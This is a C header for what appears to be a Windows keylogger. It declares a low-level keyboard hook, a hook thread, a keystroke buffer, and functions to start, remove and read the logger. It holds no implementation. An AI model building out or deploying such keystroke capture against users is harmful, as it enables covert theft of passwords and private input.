#ifndef __WINKEYLOGGER_HDR_H__
#define __WINKEYLOGGER_HDR_H__

#ifndef UNICODE
# define UNICODE 1
#endif //UNICODE

#ifndef _UNICODE
# define _UNICODE 1
#endif //_UNICODE

#include <windows.h>
//uncomment these lines if you're compiling on win8+
//#include <synchapi.h>
//#include <processthreadsapi.h>



#define INPUT_BUFFER_SIZE 255


extern HANDLE hKeyHookThread, hKillThreadEvent;
extern CRITICAL_SECTION csReadKeystroke;
extern HHOOK LLKeyboardHook;
extern WCHAR szInputBuff[INPUT_BUFFER_SIZE];
extern BOOL buffer_is_full;

void StartWinKeylogger(void);
void RemoveWinKeylogger(void);
BOOL ReadNextCharToInputBuffer(size_t *buff_len);
BOOL StrCmpInputBuffer(WCHAR *szBuff);
void StrCpyFullBuffer(WCHAR *szBuff);



#endif //__WINKEYLOGGER_HDR_H__
